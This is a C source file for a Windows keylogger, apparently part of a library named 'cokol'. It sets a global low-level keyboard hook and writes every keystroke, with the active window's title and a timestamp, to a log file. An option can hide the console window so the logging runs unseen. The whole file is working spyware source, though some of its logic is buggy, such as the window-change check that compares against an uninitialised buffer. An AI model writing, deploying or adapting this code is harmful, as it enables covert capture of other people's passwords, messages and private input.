#include "cokol.h"

int8_t log_key(const DWORD *KEY) {
    if (*KEY == 1 | *KEY == 2) {
        return -1;
    }

    HWND foreground_program = GetForegroundWindow();
    DWORD thread_id = GetWindowThreadProcessId(foreground_program, NULL);
    HKL keyboard_layout = GetKeyboardLayout(thread_id);

    if (foreground_program) {
        char previous_program[256];
        char current_program[256];

        GetWindowText(foreground_program, current_program, 256);

        if (strcmp(current_program, previous_program) != 0) {
            strcpy_s(previous_program, sizeof(previous_program), current_program);

            time_t current_time;
            struct tm *time_info;
            char time_str[9];

            time(&current_time);
            time_info = localtime(&current_time);
            strftime(time_str, sizeof(time_str), "%H:%M:%S", time_info);

            fprintf(
                    key_log,
                    "[PROGRAM: %s | TIME: %s | !!! KEY LOG STARTS FROM NEW LINE !!!]\n",
                    current_program,
                    time_str
            );

            printf("[PROGRAM: %s | TIME: %s]\n", current_program, time_str);
        }
    }

    printf("Key: %lu\n", *KEY);

    switch (*KEY) {
        case VK_BACK: {
#ifdef KEY_REPLACEMENT__VK_BACK
            fprintf(key_log, "%s", KEY_REPLACEMENT__VK_BACK);
#endif

#ifndef KEY_REPLACEMENT__VK_BACK
            fprintf(key_log, "[BACKSPACE]");
#endif
            break;
        }
        case VK_RETURN: {
#ifdef KEY_REPLACEMENT__VK_RETURN
            fprintf(key_log, "%s", KEY_REPLACEMENT__VK_RETURN);
#endif

#ifndef KEY_REPLACEMENT__VK_RETURN
            fprintf(key_log, "\n");
#endif
            break;
        }
        case VK_SPACE: {
#ifdef KEY_REPLACEMENT__VK_SPACE
            fprintf(key_log, "%s", KEY_REPLACEMENT__VK_SPACE);
#endif

#ifndef KEY_REPLACEMENT__VK_SPACE
            fprintf(key_log, " ");
#endif
            break;
        }
        case VK_TAB: {
#ifdef KEY_REPLACEMENT__VK_TAB
            fprintf(key_log, "%s", KEY_REPLACEMENT__VK_TAB);
#endif
#ifndef KEY_REPLACEMENT__VK_TAB
            fprintf(key_log, "[TAB]");
#endif
            break;
        }
        case VK_ESCAPE: {
#ifdef KEY_REPLACEMENT__VK_ESCAPE
            fprintf(key_log, "%s", KEY_REPLACEMENT__VK_ESCAPE);
#endif
#ifndef KEY_REPLACEMENT__VK_ESCAPE
            fprintf(key_log, "[ESC]");
#endif
            break;
        }
        case VK_END: {
#ifdef KEY_REPLACEMENT__VK_END
            fprintf(key_log, "%s", KEY_REPLACEMENT__VK_END);
#endif
#ifndef KEY_REPLACEMENT__VK_END
            fprintf(key_log, "[END]");
#endif
            break;
        }
        case VK_HOME: {
#ifdef KEY_REPLACEMENT__VK_HOME
            fprintf(key_log, "%s", KEY_REPLACEMENT__VK_HOME);
#endif
#ifndef KEY_REPLACEMENT__VK_HOME
            fprintf(key_log, "[HOME]");
#endif
            break;
        }
        case VK_LEFT: {
#ifdef KEY_REPLACEMENT__VK_LEFT
            fprintf(key_log, "%s", KEY_REPLACEMENT__VK_LEFT);
#endif

#ifndef KEY_REPLACEMENT__VK_LEFT
            fprintf(key_log, "[LEFT]");
#endif
            break;
        }
        case VK_RIGHT: {
#ifdef KEY_REPLACEMENT__VK_RIGHT
            fprintf(key_log, "%s", KEY_REPLACEMENT__VK_RIGHT);
#endif
#ifndef KEY_REPLACEMENT__VK_RIGHT
            fprintf(key_log, "[RIGHT]");
#endif
            break;
        }
        case VK_UP: {
#ifdef KEY_REPLACEMENT__VK_UP
            fprintf(key_log, "%s", KEY_REPLACEMENT__VK_UP);
#endif
#ifndef KEY_REPLACEMENT__VK_UP
            fprintf(key_log, "[UP]");
#endif
            break;
        }
        case VK_DOWN: {
#ifdef KEY_REPLACEMENT__VK_DOWN
            fprintf(key_log, "%s", KEY_REPLACEMENT__VK_DOWN);
#endif
#ifndef KEY_REPLACEMENT__VK_DOWN
            fprintf(key_log, "[DOWN]");
#endif
            break;
        }
        case 20: {
#ifdef KEY_REPLACEMENT__CAPS
            fprintf(key_log, "%s", KEY_REPLACEMENT__CAPS);
#endif
#ifndef KEY_REPLACEMENT__CAPS
            fprintf(key_log, "[CAPS]");
#endif
            break;
        }
        case 190:
        case 110: {
            fprintf(key_log, ".");
            break;
        }
        case 189:
        case 109: {
            fprintf(key_log, "-");
            break;
        }
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT: {
#ifdef KEY_REPLACEMENT__VK_SHIFT
            fprintf(key_log, "%s", KEY_REPLACEMENT__VK_SHIFT);
#endif
#ifndef KEY_REPLACEMENT__VK_SHIFT
            fprintf(key_log, "[SHIFT]");
#endif
            break;
        }
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL: {
#ifdef KEY_REPLACEMENT__VK_CONTROL
            fprintf(key_log, "%s", KEY_REPLACEMENT__VK_CONTROL);
#endif
#ifndef KEY_REPLACEMENT__VK_CONTROL
            fprintf(key_log, "[CTRL]");
#endif
            break;
        }
        default: {
            int is_lowercase = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 ||
                (GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
                (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
                is_lowercase = !is_lowercase;
            }

            char current_key = (char) MapVirtualKeyExA(
                    *KEY,
                    MAPVK_VK_TO_CHAR,
                    keyboard_layout
            );

            if (!is_lowercase) {
                current_key = (char) tolower(current_key);
            }

            fprintf(key_log, "%c", current_key);
        }
    }

    fflush(key_log);

    return 0;
}

LRESULT __stdcall keyboard_hook_callback(int n_code, WPARAM wparam, LPARAM lparam) {
    if (n_code >= 0) {
        if (wparam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT kb_struct = *((KBDLLHOOKSTRUCT *) lparam);
            log_key(&kb_struct.vkCode);
        }
    }

    return CallNextHookEx(keyboard_hook, n_code, wparam, lparam);
}

__attribute__((unused)) int8_t cokol_start_key_logging(const char *KEY_LOG_PATH, const uint8_t SHOW_CMD_WINDOW) {
    key_log = fopen(KEY_LOG_PATH, "w");
    if (!key_log) {
        return -1;
    }

    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), SHOW_CMD_WINDOW);

    if (!(keyboard_hook = SetWindowsHookEx(
            WH_KEYBOARD_LL,
            keyboard_hook_callback,
            NULL,
            0)
    )) {
        MessageBox(
                NULL,
                "An error occurred while setting up hook.",
                "Error",
                MB_ICONERROR
        );

        return -2;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboard_hook);

    return 0;
}
